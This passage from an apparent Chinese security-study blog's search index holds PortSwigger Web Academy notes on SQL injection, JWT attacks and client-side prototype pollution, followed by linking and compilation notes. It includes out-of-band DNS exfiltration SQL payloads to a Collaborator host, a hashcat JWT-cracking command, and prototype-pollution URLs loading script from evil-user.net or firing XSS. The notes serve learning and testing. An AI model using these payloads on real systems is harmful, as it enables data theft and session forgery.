Injection","uri":"/posts/portswigger_sqlinj/"},{"categories":null,"content":"带有数据过滤的DNS查询 数据库类型 语句 Oracle SELECT EXTRACTVALUE(xmltype(’\u003c?xml version=“1.0” encoding=“UTF-8”?\u003e\u003c!DOCTYPE root [ \u003c!ENTITY % remote SYSTEM “http://’||(SELECT YOUR-QUERY-HERE)||’.BURP-COLLABORATOR-SUBDOMAIN/\"\u003e %remote;]\u003e’),’/l’) FROM dual Microsoft declare @p varchar(1024);set @p=(SELECT YOUR-QUERY-HERE);exec(‘master..xp_dirtree “//’+@p+’.BURP-COLLABORATOR-SUBDOMAIN/a”’) PostgreSQL create OR replace function f() returns void as $$ declare c text; declare p text; begin SELECT into p (SELECT YOUR-QUERY-HERE); c := ‘copy (SELECT ‘’’’) to program ‘’nslookup ' p ‘.BURP-COLLABORATOR-SUBDOMAIN’’’; execute c; END; $$ language plpgsql security definer; SELECT f(); MySQL 以下只适用于Windows: LOAD_FILE(’\\\\\\\\BURP-COLLABORATOR-SUBDOMAIN\\\\a’) SELECT YOUR-QUERY-HERE INTO OUTFILE ‘\\\\\\\\BURP-COLLABORATOR-SUBDOMAIN\\a’ ","date":"2022-12-27","objectID":"/posts/portswigger_sqlinj/:5:10","tags":["Web Security","PortSwigger Web Academy","SQL"],"title":"SQL Injection","uri":"/posts/portswigger_sqlinj/"},{"categories":null,"content":"PortSwigger Web Academy 中关于 JWT 的部分","date":"2022-12-26","objectID":"/posts/portswigger_jwt/","tags":["Web Security","PortSwigger Web Academy","JWT"],"title":"JWT attacks","uri":"/posts/portswigger_jwt/"},{"categories":null,"content":"PortSwigger Web Academy 中关于 JWT 的部分 JWT attacks ","date":"2022-12-26","objectID":"/posts/portswigger_jwt/:0:0","tags":["Web Security","PortSwigger Web Academy","JWT"],"title":"JWT attacks","uri":"/posts/portswigger_jwt/"},{"categories":null,"content":"JWT JSON Web Tokens (JWT)，是一种在不同系统之前发送加密签名过的JSON数据的标准格式。通常用于发送关于用户的相关信息。 ","date":"2022-12-26","objectID":"/posts/portswigger_jwt/:1:0","tags":["Web Security","PortSwigger Web Academy","JWT"],"title":"JWT attacks","uri":"/posts/portswigger_jwt/"},{"categories":null,"content":"JWT组成 header payload signature 如下面的例子所示，三部分之间用.分隔 eyJraWQiOiI5MTM2ZGRiMy1jYjBhLTRhMTktYTA3ZS1lYWRmNWE0NGM4YjUiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTY0ODAzNzE2NCwibmFtZSI6IkNhcmxvcyBNb250b3lhIiwic3ViIjoiY2FybG9zIiwicm9sZSI6ImJsb2dfYXV0aG9yIiwiZW1haWwiOiJjYXJsb3NAY2FybG9zLW1vbnRveWEubmV0IiwiaWF0IjoxNTE2MjM5MDIyfQ.SYZBPIBg2CRjXAJ8vCER0LA_ENjII1JakvNQoP-Hw6GG1zfl4JyngsZReIfqRvIAEi5L4HV0q7_9qGhQZvy9ZdxEJbwTxRs_6Lb-fZTDpW6lKYNdMyjw45_alSCZ1fypsMWz_2mTpQzil0lOtps5Ei_z7mM7M8gCwe_AGpI53JxduQOaB5HkT5gVrv9cKu9CsW5MS6ZbqYXpGyOG5ehoxqm8DL5tFYaW3lB50ELxi0KsuTKEbD0t5BCl0aCR2MBJWAbN-xeLwEenaqBiwPVvKixYleeDQiBEIylFdNNIMviKRgXiYuAvMziVPbwSgkZVHeEdF5MQP1Oe2Spac-6IfA header和payload两个部分都是base64_url编码的JSON对象，header包括令牌本身的数据，payload包括关于用户实际的声明。例如上述的令牌的payload解码后就是： { \"iss\": \"portswigger\", \"exp\": 1648037164, \"name\": \"Carlos Montoya\", \"sub\": \"carlos\", \"role\": \"blog_author\", \"email\": \"carlos@carlos-montoya.net\", \"iat\": 1516239022 } 大多数情况下，能拿到令牌就意味着能够修改它，所以基于JWT机制的安全性都依赖于加密签名。 ","date":"2022-12-26","objectID":"/posts/portswigger_jwt/:1:1","tags":["Web Security","PortSwigger Web Academy","JWT"],"title":"JWT attacks","uri":"/posts/portswigger_jwt/"},{"categories":null,"content":"JWT signature 发出令牌的签名通常由对header和payload消息摘要算法处理而成。有时候会把消息摘要算法处理过的结果进行加密。无论时候进行后续的加密，这个过程都会涉及到一个密钥。 由于signature包括令牌的其他部分，所以更改header或paylaod都会导致signature不匹配 如果不知道密钥，就不能根据header和payload生成正确的signatire ","date":"2022-12-26","objectID":"/posts/portswigger_jwt/:1:2","tags":["Web Security","PortSwigger Web Academy","JWT"],"title":"JWT attacks","uri":"/posts/portswigger_jwt/"},{"categories":null,"content":"JWT JWS JWE JWT只定义了一种表达信息的格式作为一个在不同系统之间传递的JSON对象。事实上JWT并不是作为独立的实体使用。JWT由JSON Web Signature (JWS)和JSON Web Encryption (JWE)扩展而成，它们定义实现JWT的具体方法。 JWT通常时JWS或JWE令牌。通常使用JWT的时候都在说JWS令牌。JWEs和它相似，只不过令牌的内容时加密的而非编码的。 ","date":"2022-12-26","objectID":"/posts/portswigger_jwt/:1:3","tags":["Web Security","PortSwigger Web Academy","JWT"],"title":"JWT attacks","uri":"/posts/portswigger_jwt/"},{"categories":null,"content":"JWT攻击 ","date":"2022-12-26","objectID":"/posts/portswigger_jwt/:2:0","tags":["Web Security","PortSwigger Web Academy","JWT"],"title":"JWT attacks","uri":"/posts/portswigger_jwt/"},{"categories":null,"content":"概述 JWT攻击就是修改用户发送给服务器的JWT，通常用于模拟另一个身份去绕过身份验证和一些访问上的限制。 ","date":"2022-12-26","objectID":"/posts/portswigger_jwt/:2:1","tags":["Web Security","PortSwigger Web Academy","JWT"],"title":"JWT attacks","uri":"/posts/portswigger_jwt/"},{"categories":null,"content":"漏洞产生条件 JWT漏洞通常因为网站对JWT的处理有问题而产生，因为很多实现细节是由网站开发者自己确定的。 这些问题通常就是JWT的signature没有得到正确的验证，或者密钥是否被暴力破解或泄露。 ","date":"2022-12-26","objectID":"/posts/portswigger_jwt/:2:2","tags":["Web Security","PortSwigger Web Academy","JWT"],"title":"JWT attacks","uri":"/posts/portswigger_jwt/"},{"categories":null,"content":"漏洞利用 接收任意signatures JWT库提供了两个方法，一个用于验证令牌，一个只用于解码。例如Node.js的jsonwebtoken库有verify()和decode()。如果开发者并不清楚这两个方法，只是将令牌给了decode()，那么signature也就形同虚设了。 没有signature的令牌 JWT的header中有个alg参数，它指明了服务器使用那种算法对令牌进行签名。 服务器信任alg参数指定的算法，攻击者可以选择修改算法名称。alg参数可以被设置为none并删除signature，服务器通常会拒绝这样的令牌，有时候可以通过混淆来绕过对这样字符串的过滤。虽然没有了signature，但是payload和signature之间的.需要保留。 暴力破解密钥 一些消息摘要算法使用任意字符串作为密钥，像HS256(HMAC + SHA-256)。 开发者实现JWT时可能会犯一些错误，比如使用弱密码，这时候攻击者可以选择暴力破解这个密钥。 使用hashcat hashcat -a 0 -m 16500 \u003cjwt\u003e \u003cwordlist\u003e JWT header参数注入 JWS规定header中必须有alg参数，实际上JWT的header还有其他参数，比如： jwk (JSON Web Key)，提供一个表示key的JSON对象 jku (JSON Web Key Set URL)，提供了一个可以让服务器从中获取包含正确密钥的一组密钥的URL kid (Key ID)，提供一个当有多个密钥的情况下用于确定正确密钥的ID 这些参数用于服务器验证signature使用哪个密钥。 注入jwk参数 服务器使用该参数将其公钥以jwk格式嵌入令牌中，例如： { \"kid\": \"ed2Nf8sb-sD6ng0-scs5390g-fFD8sfxG\", \"typ\": \"JWT\", \"alg\": \"RS256\", \"jwk\": { \"kty\": \"RSA\", \"e\": \"AQAB\", \"kid\": \"ed2Nf8sb-sD6ng0-scs5390g-fFD8sfxG\", \"n\": \"yy1wpYmffgXBxhAUJzHHocCuJolwDqql75ZWuCQ_cb33K2vh9m\" } } 服务器会使用公钥白名单来验证JWT的signature，然而错误的配置服务器会导致它使用jwk中的任何密钥。攻击者可以用自己的RSA私钥处理一个修改后的JWT，然后将匹配的公钥放在jwk中。 注入jku参数 从中获取到的是一个JSON对象： { \"keys\": [ { \"kty\": \"RSA\", \"e\": \"AQAB\", \"kid\": \"75d0ef47-af89-47a9-9061-7c02a610d5ab\", \"n\": \"o-yy1wpYmffgXBxhAUJzHHocCuJolwDqql75ZWuCQ_cb33K2vh9mk6GPM9gNN4Y_qTVX67WhsN3JvaFYw-fhvsWQ\" }, { \"kty\": \"RSA\", \"e\": \"AQAB\", \"kid\": \"d8fDFo-fS9-faS14a9-ASf99sa-7c1Ad5abA\", \"n\": \"fc3f-yy1wpYmffgXBxhAUJzHql79gNNQ_cb33HocCuJolwDqmk6GPM4Y_qTVX67WhsN3JvaFYw-dfg6DH-asAScw\" } ] } 攻击者通过修改jku指向的URL，修改后的URL存储自己的密钥信息，就可以通过校验 注入kid参数 服务器可能会使用多个密钥对不同类型的数据进行签名，这样JWT的header可能包含一个kid参数用于确定验证签名时使用哪个密钥。 JWS规范没有定义kid的具体结构，这是开发人员选择的一个任意的字符串。kid可以是指向数据库的特定条目，甚至指向一个文件名。 { \"kid\": \"../../path/to/file\", \"typ\": \"JWT\", \"alg\": \"HS256\", \"k\": \"asGsADas3421-dfh9DGN-AFDFDbasfd8-anfjkvc\" } 如果服务器支持对称加密算法处理的JWT，攻击者可以使kid参数指向一个已知的文件，并且使用与该文件内容对应的密钥。例如指向/dev/null这个文件，使用Base64编码过的空字节对令牌进行对称加密。如果密钥被存储在数据库中，kid参数还是一个可能出现SQL注入的地方。 其他参数 cty (Content Type)，通常在不会存在于header中，但是底层解析库无疑是支持它的。将cty的值改成text/xml或application/x-java-serialized-object，这可能会造成XXE或反序列化。 x5c (X.509 Certificate Chain)，用于传递密钥的X.509公钥证书或证书链。该参数可以被注入自签名的证书。CVE-2017-2800和CVE-2018-2633 算法混淆 算法混淆（密钥混淆）是因为攻击者可以强制服务器使用网站开发者没想到的算法来验证JWT的signature。 对称加密与非对称加密 JWT可以使用不同的算法进行签名处理。HS256 (HMAC + SHA-256)使用对称的密钥，这意味着加解密用的是同一个密钥。RS256 (RSA + SHA-256)使用非对称的密钥，这包括公钥（用于验证签名）和私钥（即可签名可以验证）。 漏洞产生 由于JWT库的实现的缺陷，通常会出现算法混淆漏洞。尽管现实中的验证过程所使用的算法会有所不同，但很多库提供来一种单一且与算法无关的方法来验证签名。这种方法依赖于alg参数确定验证类型。 下面的伪代码展示来一个通用的verify()函数可能是什么样： function verify(token, secretOrPublicKey){ algorithm = token.getAlgHeader(); if(algorithm == \"RS256\"){ // Use the provided key as an RSA public key } else if (algorithm == \"HS256\"){ // Use the provided key as an HMAC secret key } } 假设使用这种函数的网站开发者用它专门处理非对称加密算法 publicKey = \u003cpublic-key-of-server\u003e; token = request.getCookie(\"session\"); verify(token, publicKey); 这种情况下，服务器接收一个对称加密算法处理的令牌，verify()函数会把公钥视作密钥。攻击者可以使用非对称加密的公钥对令牌进行签名，服务器用公钥来验证签名。 攻击步骤 获取服务器公钥 转换公钥的格式 修改JWT的payload和header的alg 使用公钥作为密钥对其进行签名 获取服务器公钥 服务器有时会通过/jwks.json或/.well-known/jwks.json将公钥作为JWK (JSON Web Key)公开。 即使不公开，也可以根据多个已知的JWT搞出公钥。 对于上述情况，GitHub的rsa_sign2n仓库存在jwt_forgery.py等脚本对此有所帮助。 转换公钥的格式 虽然服务器可能会公开它们的公钥，但是验证令牌的signature的时候用的是本地文件或数据库中存储的副本，这俩之前可能以不同的形式存储。 为了保证攻击成功，攻击者需要保证用来签名的密钥和服务器的不仅格式一致，每一个字节都是一样的。比如可能需要的是X.509 PEM格式的密钥，但获得的是JWK格式。 ","date":"2022-12-26","objectID":"/posts/portswigger_jwt/:2:3","tags":["Web Security","PortSwigger Web Academy","JWT"],"title":"JWT attacks","uri":"/posts/portswigger_jwt/"},{"categories":null,"content":"PortSwigger Web Academy 中关于 Client-side prototype pollution 的部分","date":"2022-12-25","objectID":"/posts/portswigger_ppul/","tags":["Web Security","PortSwigger Web Academy"],"title":"Client-side prototype pollution","uri":"/posts/portswigger_ppul/"},{"categories":null,"content":"PortSwigger Web Academy 中关于 Client-side prototype pollution 的部分 Client-side prototype pollution ","date":"2022-12-25","objectID":"/posts/portswigger_ppul/:0:0","tags":["Web Security","PortSwigger Web Academy"],"title":"Client-side prototype pollution","uri":"/posts/portswigger_ppul/"},{"categories":null,"content":"概述 prototype污染是一个JavaScript漏洞，该漏洞使得攻击者可以向全局prototype添加proerties，这些properties可能会被用户定义的对象继承。 通常prototype污染都是和其他漏洞一起利用打组合拳。 ","date":"2022-12-25","objectID":"/posts/portswigger_ppul/:1:0","tags":["Web Security","PortSwigger Web Academy"],"title":"Client-side prototype pollution","uri":"/posts/portswigger_ppul/"},{"categories":null,"content":"JavaScript prototypes 和其他基于类的语言不同，JavaScript使用Prototypes继承模型。 ","date":"2022-12-25","objectID":"/posts/portswigger_ppul/:2:0","tags":["Web Security","PortSwigger Web Academy"],"title":"Client-side prototype pollution","uri":"/posts/portswigger_ppul/"},{"categories":null,"content":"对象 JavaScript的对象实际上就是被称为properties的键值对 const user = { username: \"wiener\", userId: 01234, isAdmin: false, }; 访问一个对象的proerties可以通过如下两种方式 user.username; // \"wiener\" user[\"userId\"]; // 01234 properties同样也可以是函数，被称为方法 const user = { username: \"wiener\", userId: 01234, exampleMethod: function () { // do something }, }; ","date":"2022-12-25","objectID":"/posts/portswigger_ppul/:2:1","tags":["Web Security","PortSwigger Web Academy"],"title":"Client-side prototype pollution","uri":"/posts/portswigger_ppul/"},{"categories":null,"content":"prototypes 任何一个JavaScript的对象被链接到另一种类型的对象，被称之为prototype。默认情况下，JavaScript自动为新对象分配其内置的全局prototype之一。例如string会被自动被分配内置的String.prototype。 let myObject = {}; Object.getPrototypeOf(myObject); // Object.prototype let myString = \"\"; Object.getPrototypeOf(myString); // String.prototype let myArray = []; Object.getPrototypeOf(myArray); // Array.prototype let myNumber = 1; Object.getPrototypeOf(myNumber); // Number.prototype 对象自动继承被分配的prototype的所有properties，除非该对象已经有了相关的定义。这允许开发者创建新的类重用已有的类的properties或方法。 内置全局prototypes提供了一些有用的properties和方法去处理基本的数据类型。例如String.prototype有toLowerCase()方法，这可以让字符串自然就存在一个随时可用的方法将他们转换成lowercase，这就节省了开发者的精力。 ","date":"2022-12-25","objectID":"/posts/portswigger_ppul/:2:2","tags":["Web Security","PortSwigger Web Academy"],"title":"Client-side prototype pollution","uri":"/posts/portswigger_ppul/"},{"categories":null,"content":"对象继承 当引用一个对象的property的时候，JavaScript引擎会先在对象本身去寻找，没找到再去对应的全局prototype寻找 ","date":"2022-12-25","objectID":"/posts/portswigger_ppul/:2:3","tags":["Web Security","PortSwigger Web Academy"],"title":"Client-side prototype pollution","uri":"/posts/portswigger_ppul/"},{"categories":null,"content":"prototype链 每一个对象的prototype也是一个对象，这个对象同样也会有对应的prototype。JavaScript中几乎所有的东西都是一个对象，这个链的终点就是Object.prototype，它的prototype是null。 ","date":"2022-12-25","objectID":"/posts/portswigger_ppul/:2:4","tags":["Web Security","PortSwigger Web Academy"],"title":"Client-side prototype pollution","uri":"/posts/portswigger_ppul/"},{"categories":null,"content":"__proto__ 每个对象都有一个特殊的property去访问他的prototype。虽然这没有一个正式标准化的名字，但是大多数浏览器以__proto__作为行业标准。这个property提供了读写两种操作，不仅可以读取prototype和他的properties，并且还可以在必要的时候修改它。 同样有两种方法访问__proto__ username.__proto__; username[\"__proto__\"]; 也可以多来几个访问prototype的prototype username.__proto__; // String.prototype username.__proto__.__proto__; // Object.prototype username.__proto__.__proto__.__proto__; // null ","date":"2022-12-25","objectID":"/posts/portswigger_ppul/:2:5","tags":["Web Security","PortSwigger Web Academy"],"title":"Client-side prototype pollution","uri":"/posts/portswigger_ppul/"},{"categories":null,"content":"修改prototype 只需要正常的修改即可，比如给String.prototype添加一个方法 String.prototype.removeWhitespace = function () { // remove leading and trailing whitespace }; let searchTerm = \" example \"; searchTerm.removeWhitespace(); // \"example\" 字符串都继承了这个prototype，所以都能调用这个方法。 ","date":"2022-12-25","objectID":"/posts/portswigger_ppul/:2:6","tags":["Web Security","PortSwigger Web Academy"],"title":"Client-side prototype pollution","uri":"/posts/portswigger_ppul/"},{"categories":null,"content":"漏洞产生 JavaScript函数递归地将包含可控properties的对象合并到现有对象中的时候，就有可能出现prototype污染漏洞。攻击者可以通过__proto__或者其他任意嵌套的properties去注入。 由于__proto__的含义，合并操作可以将properties分配给对象的prototype而不是它本身。 ","date":"2022-12-25","objectID":"/posts/portswigger_ppul/:3:0","tags":["Web Security","PortSwigger Web Academy"],"title":"Client-side prototype pollution","uri":"/posts/portswigger_ppul/"},{"categories":null,"content":"漏洞利用 污染源：可以去污染的全局prototype 一个支持任意代码执行的方法或者DOM元素 gadget： 它被不安全地使用 继承了攻击者污染的prototype，被修改的properties不能在gadget上已有定义。一些网站会让对象的prototype为null以确保它没有继承任何东西。 ","date":"2022-12-25","objectID":"/posts/portswigger_ppul/:4:0","tags":["Web Security","PortSwigger Web Academy"],"title":"Client-side prototype pollution","uri":"/posts/portswigger_ppul/"},{"categories":null,"content":"污染源 污染源允许攻击者输入添加properties到全局prototype，常见污染源如下： URL JSON输入 Web信息 基于URL的prototype污染 https://vulnerable-website.com/?__proto__[evilProperty]=payload 当将查询字符串分解成键值对时，__proto__可能被解释为任意字符串，合并到对象时不会合并到对象本身，而是分配给prototype，语句类似这样： targetObject.__proto__.evilProperty = \"payload\"; 基于JSON 输入的prototype污染 用户可控的对象通常使用JSON.parse()方法派生自JSON字符串。JSON.parse()方法将JSON对象的任何key视作字符串，包括__proto__这样的。 假设攻击者通过Web信息注入恶意的JSON： { \"__proto__\": { \"evilProperty\": \"payload\" } } 再通过JSON.parse()方法将它转换为JavaScript对象，生成的对象就会具有__proto__这样的property。 const objectLiteral = { __proto__: { evilProperty: \"payload\" } }; const objectFromJson = JSON.parse('{\"__proto__\": {\"evilProperty\": \"payload\"}}'); objectLiteral.hasOwnProperty(\"__proto__\"); // false objectFromJson.hasOwnProperty(\"__proto__\"); // true 如果这样的对象与现有对象合并，并且没有进行适当的过滤，就可以导致prototype污染。 ","date":"2022-12-25","objectID":"/posts/portswigger_ppul/:4:1","tags":["Web Security","PortSwigger Web Academy"],"title":"Client-side prototype pollution","uri":"/posts/portswigger_ppul/"},{"categories":null,"content":"例子 很多JavaScript库允许开发者给对象使用不用的配置选项。库代码检查开发人员是否显示地向对象添加属性，如果添加则会相应地调整配置。如果特定选项的property不存在就会使用预定义的默认选项。 let transport_url = config.transport_url || defaults.transport_url; 假设库代码使用transport_url向页面添加一个脚本引用 let script = document.createElement(\"script\"); script.src = `${transport_url}/example.js`; document.body.appendChild(script); 如果网站开发者为由为config对象设置transport_urlproperty的话，这就是一个gadget。攻击者可以利用自己的transport_url污染全局Object.prototype，这将被config对象继承。脚本的src也被设置为攻击者指定的域名。 如果这个prototype可以被查询参数污染，受害者只需点击下方链接即可从攻击者指定的域中导入一个JS文件 https://vulnerable-website.com/?__proto__[transport_url]=//evil-user.net 攻击者可以直接诶嵌入XSS的payload，例如 https://vulnerable-website.com/?__proto__[transport_url]=data:,alert(1);// 上述URL后面的//时为了绕过/example.js后缀 ","date":"2022-12-25","objectID":"/posts/portswigger_ppul/:4:2","tags":["Web Security","PortSwigger Web Academy"],"title":"Client-side prototype pollution","uri":"/posts/portswigger_ppul/"},{"categories":null,"content":"发现漏洞 ","date":"2022-12-25","objectID":"/posts/portswigger_ppul/:5:0","tags":["Web Security","PortSwigger Web Academy"],"title":"Client-side prototype pollution","uri":"/posts/portswigger_ppul/"},{"categories":null,"content":"寻找污染点 手工挖掘 手工挖掘就是试错，尝试采用不同的方法向Object.prototype添加任意的property。 1 .尝试去在一些地方注入任意的property，比如： vulnerable-website.com/?__proto__[foo]=bar 2 .在浏览器console检查Object.prototype以确认这个property是否成功污染了它 3 .如果property没有被添加到全局prototype中，尝试不同的方法，比如用.而不是[]： vulnerable-website.com/?__proto__.foo=bar 使用 DOM Invader 用于代替手工挖掘 ","date":"2022-12-25","objectID":"/posts/portswigger_ppul/:5:1","tags":["Web Security","PortSwigger Web Academy"],"title":"Client-side prototype pollution","uri":"/posts/portswigger_ppul/"},{"categories":null,"content":"寻找gadget 手工挖掘 观察源代码并确认被使用的任何properties 拦截包含要测试的JavaScript的响应数据包 在脚本开头添加一个debuger，然后转发剩余的数据包 打开脚本被载入的页面，添加的debuger会暂停脚本的执行 此时在浏览器console输入以下命令： Object.defineProperty(Object.prototype, \"YOUR-PROPERTY\", { get() { console.trace(); return \"polluted\"; }, }); 这个property被记录到全局Object.prototype。每次访问这个property的时候，浏览器都会将堆栈跟踪记录到console 继续执行脚本并且监视console。只要堆栈真的被记录了就可以确定这个property被访问了 展开堆栈跟踪并且使用它提供的链接跳转到正在读取property的代码所在的行 使用浏览器调试，逐步执行以查看这个property是否被传递给sink，比如innerHTML或eval() 使用DOM Invader 手工寻找gadget在目前网站通常依赖于大量第三方库的情况下是一个艰巨的任务。 ","date":"2022-12-25","objectID":"/posts/portswigger_ppul/:5:2","tags":["Web Security","PortSwigger Web Academy"],"title":"Client-side prototype pollution","uri":"/posts/portswigger_ppul/"},{"categories":null,"content":"通过constructor实现prototype污染 上面阐述的经典的prototype污染，一个常见的防御方法就是在合并用户可控对象之前去掉任何带有__proto__的property。事实上有其他方法在不依赖__proto__字符串的情况下引用Object.prototype 除非prototype为null，否则每个JS对象都有一个名为constructor的property，其中包含对创建它的构造函数的引用。下面两条语句就是调用Object构造函数： let myObjectLiteral = {}; let myObject = new Object(); 也可以直接调用construcotr： myObjectLiteral.constructor; // function Object(){...} myObject.constructor; // function Object(){...} 函数实际上也是对象。每个构造函数都有一个叫做prototype的porperty，它指向了被分配给由这个构造函数创建出的任何对象的prototype，所以也可以通过这个来访问对象的prototype myObject.constructor.prototype; // Object.prototype myString.constructor.prototype; // String.prototype myArray.constructor.prototype; // Array.prototype 由此可见，myObject.constructor.prototype等价于myObject.__proto__，攻击的时候就有一个可供替代的选项 ","date":"2022-12-25","objectID":"/posts/portswigger_ppul/:6:0","tags":["Web Security","PortSwigger Web Academy"],"title":"Client-side prototype pollution","uri":"/posts/portswigger_ppul/"},{"categories":null,"content":"通过浏览器API实现prototype污染 ","date":"2022-12-25","objectID":"/posts/portswigger_ppul/:7:0","tags":["Web Security","PortSwigger Web Academy"],"title":"Client-side prototype pollution","uri":"/posts/portswigger_ppul/"},{"categories":null,"content":"fetch() fetchAPI能够简单地发送HTTP请求，fetch()函数总共接收两个参数： URL 一个可以指定请求数据包一些参数的对象 下面这个例子展示了如何通过这个函数发送一个POST请求： fetch(\"https://normal-website.com/my-account/change-email\", { method: \"POST\", body: \"user=carlos\u0026email=carlos%40ginandjuice.shop\", }); 上述代码定义了method和boby两个properties，但还有一些prpperities没有定义。攻击者可以使用自己的headersproperty污染Object.prototype，然后被传递到fetch()函数的对象继承，随即发送请求。 fetch(\"/my-products.json\", { method: \"GET\" }) .then(response =\u003e response.json()) .then(data =\u003e { let username = data[\"x-username\"]; let message = document.querySelector(\".message\"); if (username) { message.innerHTML = `My products. Logged in as \u003cb\u003e${username}\u003c/b\u003e`; } let productList = document.querySelector(\"ul.products\"); for (let product of data) { let product = document.createElement(\"li\"); product.append(product.name); productList.append(product); } }) .catch(console.error); 攻击者可以通过x-usernameheaders污染Object.prototype： ?__proto__[headers][x-username]=\u003cimg/src/onerror=alert(1)\u003e ","date":"2022-12-25","objectID":"/posts/portswigger_ppul/:7:1","tags":["Web Security","PortSwigger Web Academy"],"title":"Client-side prototype pollution","uri":"/posts/portswigger_ppul/"},{"categories":null,"content":"Object.defineProperty() 开发者可以使用Object.defineProperty()来使得对象有不可被修改的property： Object.defineProperty(vulnerableObject, \"gadgetProperty\", { configurable: false, writable: false, }); 上述代码看上去可以是一个合理的写法，实际上是有缺陷的。就像上边的fetch()函数一样，Object.defineProperty()也接收一个对象。开发者可以使用这个对象为正在定义的属性赋初值，不过如果只是为了防犯这个攻击，开发者可能不会设置一个初始值。 攻击者可以通过恶意value这个property污染Object.prototype绕过这个防御。如果它被传递给Object.defineProtoperty()的对象继承了，用户可控的值可能最终就被分配给gadget property。 ","date":"2022-12-25","objectID":"/posts/portswigger_ppul/:7:2","tags":["Web Security","PortSwigger Web Academy"],"title":"Client-side prototype pollution","uri":"/posts/portswigger_ppul/"},{"categories":null,"content":"程序员的自我修养：链接、装载与库这本书的读书笔记","date":"2022-10-30","objectID":"/posts/op_power-static-link/","tags":["readding notes","compilation principle"],"title":"程序员的自我修养：静态链接","uri":"/posts/op_power-static-link/"},{"categories":null,"content":"程序员的自我修养：链接、装载与库这本书的读书笔记 编译和链接 ","date":"2022-10-30","objectID":"/posts/op_power-static-link/:0:0","tags":["readding notes","compilation principle"],"title":"程序员的自我修养：静态链接","uri":"/posts/op_power-static-link/"},{"categories":null,"content":"被隐藏的过程 编译器利用源代码输出与之对应的可执行文件可以被分解为四个步骤：预处理、汇编、编译和链接。 ","date":"2022-10-30","objectID":"/posts/op_power-static-link/:1:0","tags":["readding notes","compilation principle"],"title":"程序员的自我修养：静态链接","uri":"/posts/op_power-static-link/"},{"categories":null,"content":"预处理 预处理阶段处理那些预处理指令（以#开头的那些）。 $ gcc -E hello.c -o hello.i 处理规则如下： 将所有的#define删除，展开所有的宏定义。 处理所有的条件预处理指令，如#if、#ifdef、#elif、#else、#endif 处理#include预处理指令，将包含的文件插入该预编译指令的位置。 删除所有的注释 添加行号和文件名标识，以便编译时产生调试用的行号信息和用于报错 保留所有的#program指令 ","date":"2022-10-30","objectID":"/posts/op_power-static-link/:1:1","tags":["readding notes","compilation principle"],"title":"程序员的自我修养：静态链接","uri":"/posts/op_power-static-link/"},{"categories":null,"content":"编译 编译就是将处理完的文件进行一系列的词法分析、语法分析及优化后生成对应的汇编代码文件 ","date":"2022-10-30","objectID":"/posts/op_power-static-link/:1:2","tags":["readding notes","compilation principle"],"title":"程序员的自我修养：静态链接","uri":"/posts/op_power-static-link/"},{"categories":null,"content":"汇编 汇编就是将汇编代码转化成机器代码 ","date":"2022-10-30","objectID":"/posts/op_power-static-link/:1:3","tags":["readding notes","compilation principle"],"title":"程序员的自我修养：静态链接","uri":"/posts/op_power-static-link/"},{"categories":null,"content":"链接 链接就是将引入的头文件链接到一起 ","date":"2022-10-30","objectID":"/posts/op_power-static-link/:1:4","tags":["readding notes","compilation principle"],"title":"程序员的自我修养：静态链接","uri":"/posts/op_power-static-link/"},{"categories":null,"content":"编译器的作为 假设源代码里有一句： array[index] = (index + 4) * (2 + 6); ","date":"2022-10-30","objectID":"/posts/op_power-static-link/:2:0","tags":["readding notes","compilation principle"],"title":"程序员的自我修养：静态链接","uri":"/posts/op_power-static-link/"},{"categories":null,"content":"词法分析 源代码被输入到扫描器，运用一种类似于有限状态机的算法将源代码的字符序列分割成一系列的记号。 词法分析产生的记号一般可以被分为如下几类：关键字、标识符、字面量（数字、字符串等）和特殊符号（如加号、等号）。识别的同时，扫描器也完成了其他工作。比如说将标识符存入符号表，数字、字符串常量存放到文字表等，以备后续步骤使用。 上述语句被分析后产生16个记号： 记号 类型 array 标识符 [ 左方括号 index 标识符 ] 右方括号 = 赋值 ( 左圆括号 index 标识符 + 加号 4 数字 ) 右圆括号 * 乘号 ( 左圆括号 2 数字 + 加好 6 数字 ) 右圆括号 ","date":"2022-10-30","objectID":"/posts/op_power-static-link/:2:1","tags":["readding notes","compilation principle"],"title":"程序员的自我修养：静态链接","uri":"/posts/op_power-static-link/"},{"categories":null,"content":"语法分析 语法分析将对扫描器产生的记号进行语法分析，从而产生语法树。整个过程采用上下文无关语法的分析手段。 语法分析器生成的语法数就是以表达式为节点的树： 在这个阶段，运算符的优先级也就确认下来了，如果表达式不合法，编译器会报告语法分析阶段的错误。 ","date":"2022-10-30","objectID":"/posts/op_power-static-link/:2:2","tags":["readding notes","compilation principle"],"title":"程序员的自我修养：静态链接","uri":"/posts/op_power-static-link/"},{"categories":null,"content":"语义分析 编译器能分析的是静态语义，即能够在编译阶段确定的语义。经过语义分析阶段后，整个语法树的表达式都被标识了类型，如果有些类型需要做隐式转换，语义分析程序就会在语法树上插入相应的转换节点。 ","date":"2022-10-30","objectID":"/posts/op_power-static-link/:2:3","tags":["readding notes","compilation principle"],"title":"程序员的自我修养：静态链接","uri":"/posts/op_power-static-link/"},{"categories":null,"content":"中间代码生成 源代码级别优化器往往会将整个语法树转换成中间代码。常见的中间代码有三地址码、P代码 这个时候上述表达式的2+6就可以直接被优化成8 ","date":"2022-10-30","objectID":"/posts/op_power-static-link/:2:4","tags":["readding notes","compilation principle"],"title":"程序员的自我修养：静态链接","uri":"/posts/op_power-static-link/"},{"categories":null,"content":"目标代码生成与优化 对于下边这个例子： movl index, %ecx addl $4, %ecx mull $8, %ecx movl index, %eax movl %ecx, array(, %eax, 4) 最终可以被优化为： movl index, %edx leal 32(, %edx, 8), %eax movl %eax, array(, %edx, 4) ","date":"2022-10-30","objectID":"/posts/op_power-static-link/:2:5","tags":["readding notes","compilation principle"],"title":"程序员的自我修养：静态链接","uri":"/posts/op_power-static-link/"},{"categories":null,"content":"静态链接 链接的过程包括地址和空间分配、符号决议和重定位这些步骤。符号决议有时也叫地址绑定等。静态链接的基本过程就是把编译器编译成的目标文件（扩展名一般为.o或.obj）和库一起链接形成最后的可执行文件。 链接器要对源文件未定义的变量、函数的地址加以修正。编译器会把它们的地址先设为0，等待链接器链接的时候修正地址，这个过程就是重定向。 目标文件 ","date":"2022-10-30","objectID":"/posts/op_power-static-link/:3:0","tags":["readding notes","compilation principle"],"title":"程序员的自我修养：静态链接","uri":"/posts/op_power-static-link/"},{"categories":null,"content":"目标文件的格式 Windows是PE，Linux是ELF。PE/ELF都是COFF格式的变种 ELF文件类型 说明 示例 可重定位文件 (Relocatable File) 